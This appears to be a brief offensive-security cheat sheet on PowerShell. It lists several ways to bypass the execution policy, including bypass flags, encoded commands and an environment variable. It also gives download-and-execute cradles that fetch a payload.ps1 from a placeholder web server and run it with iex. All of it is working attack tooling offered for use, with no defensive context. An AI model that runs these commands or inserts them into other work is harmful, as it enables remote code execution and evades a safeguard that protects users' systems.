# PowerShell Basics

# Bypass the prevention of users accidently executing scripts

15 ways of bypassing this execution policy -> https://www.netspi.com/blog/entryid/238/15 

powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"

# Download execute cradle 

Invoke-CradleCrafter:
https://github.com/danielbohannon/Invoke-CradleCrafter

iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

PSv3 onwards:

iex (iwr 'http://webserver/payload.ps1')

